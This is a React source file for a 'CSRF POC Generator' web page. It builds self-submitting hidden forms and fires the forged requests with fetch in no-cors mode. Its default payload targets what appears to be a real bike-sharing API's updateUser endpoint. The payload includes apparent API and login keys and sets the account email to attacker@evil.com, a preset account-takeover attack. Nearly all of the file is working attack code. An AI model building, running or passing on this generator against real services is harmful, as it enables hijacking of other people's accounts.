'use client';

import { useState } from 'react';

export default function Home() {
  const [payload, setPayload] = useState({
    action: 'http://api.nextbike.net/api/updateUser.xml',
    method: 'POST',
    params: [
      { name: 'apikey', value: 'VzFxVgTA5K8Rsk1F' },
      { name: 'loginkey', value: '8L9aJf61u58G9Ts3' },
      { name: 'email', value: 'attacker@evil.com' }
    ]
  });

  const [generatedHTML, setGeneratedHTML] = useState('');
  const [testResult, setTestResult] = useState<{ status: number; response: string } | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  const generatePayload = () => {
    const html = `
<form id="attack" action="${payload.action}" method="${payload.method}">
  ${payload.params.map(param => 
    `<input type="hidden" name="${param.name}" value="${param.value}">`
  ).join('\n  ')}
</form>
<script>document.getElementById('attack').submit();</script>`;

    setGeneratedHTML(html);
  };

  const addParam = () => {
    setPayload(prev => ({
      ...prev,
      params: [...prev.params, { name: '', value: '' }]
    }));
  };

  const removeParam = (index: number) => {
    setPayload(prev => ({
      ...prev,
      params: prev.params.filter((_, i) => i !== index)
    }));
  };

  const updateParam = (index: number, field: 'name' | 'value', value: string) => {
    setPayload(prev => ({
      ...prev,
      params: prev.params.map((param, i) => 
        i === index ? { ...param, [field]: value } : param
      )
    }));
  };

  const testPayload = async () => {
    setIsLoading(true);
    setTestResult(null);

    try {
      // Create form data from params
      const formData = new FormData();
      payload.params.forEach(param => {
        formData.append(param.name, param.value);
      });

      // Make the request
      const response = await fetch(payload.action, {
        method: payload.method,
        body: formData,
        mode: 'no-cors' // This is important for CSRF testing
      });

      setTestResult({
        status: response.status,
        response: await response.text()
      });
    } catch (error) {
      setTestResult({
        status: 0,
        response: `Error: ${error instanceof Error ? error.message : 'Unknown error'}`
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-primary text-white">
      <div className="container">
        <div className="py-8">
          <h1 className="text-2xl font-primary mb-8 text-accent">CSRF POC Generator</h1>
          
          {/* Target URL */}
          <div className="mb-6">
            <input
              type="text"
              value={payload.action}
              onChange={(e) => setPayload(prev => ({ ...prev, action: e.target.value }))}
              placeholder="Target URL"
              className="w-full p-3 bg-primary border border-accent rounded focus:border-accent-hover focus:outline-none transition-colors"
            />
          </div>

          {/* Method */}
          <div className="mb-6">
            <select
              value={payload.method}
              onChange={(e) => setPayload(prev => ({ ...prev, method: e.target.value }))}
              className="w-full p-3 bg-primary border border-accent rounded focus:border-accent-hover focus:outline-none transition-colors"
            >
              <option value="POST">POST</option>
              <option value="GET">GET</option>
            </select>
          </div>

          {/* Parameters */}
          <div className="mb-6">
            <div className="flex justify-between items-center mb-4">
              <h2 className="font-primary text-accent">Parameters</h2>
              <button
                onClick={addParam}
                className="px-4 py-2 bg-accent text-white rounded hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95"
              >
                Add Param
              </button>
            </div>
            
            {payload.params.map((param, index) => (
              <div key={index} className="flex gap-3 mb-3">
                <input
                  type="text"
                  value={param.name}
                  onChange={(e) => updateParam(index, 'name', e.target.value)}
                  placeholder="Name"
                  className="flex-1 p-3 bg-primary border border-accent rounded focus:border-accent-hover focus:outline-none transition-colors"
                />
                <input
                  type="text"
                  value={param.value}
                  onChange={(e) => updateParam(index, 'value', e.target.value)}
                  placeholder="Value"
                  className="flex-1 p-3 bg-primary border border-accent rounded focus:border-accent-hover focus:outline-none transition-colors"
                />
                <button
                  onClick={() => removeParam(index)}
                  className="px-4 py-2 bg-accent text-white rounded hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95"
                >
                  ×
                </button>
              </div>
            ))}
          </div>

          {/* Generate and Test Buttons */}
          <div className="flex gap-4 mb-6">
            <button
              onClick={generatePayload}
              className="flex-1 p-3 bg-accent text-white rounded hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Generate Payload
            </button>
            <button
              onClick={testPayload}
              disabled={!generatedHTML || isLoading}
              className="flex-1 p-3 bg-accent text-white rounded hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Testing...' : 'Test Payload'}
            </button>
          </div>

          {/* Generated HTML */}
          {generatedHTML && (
            <div className="bg-primary/50 p-6 rounded border border-accent mb-6">
              <h2 className="font-primary text-accent mb-4">Generated Payload:</h2>
              <pre className="bg-primary p-4 rounded text-sm overflow-x-auto border border-accent">
                {generatedHTML}
              </pre>
            </div>
          )}

          {/* Test Results */}
          {testResult && (
            <div className="bg-primary/50 p-6 rounded border border-accent">
              <h2 className="font-primary text-accent mb-4">Test Results:</h2>
              <div className="space-y-4">
                <div>
                  <span className="text-accent">Status: </span>
                  <span className={testResult.status === 200 ? 'text-green-500' : 'text-red-500'}>
                    {testResult.status}
                  </span>
                </div>
                <div>
                  <span className="text-accent">Response: </span>
                  <pre className="mt-2 bg-primary p-4 rounded text-sm overflow-x-auto border border-accent">
                    {testResult.response}
                  </pre>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}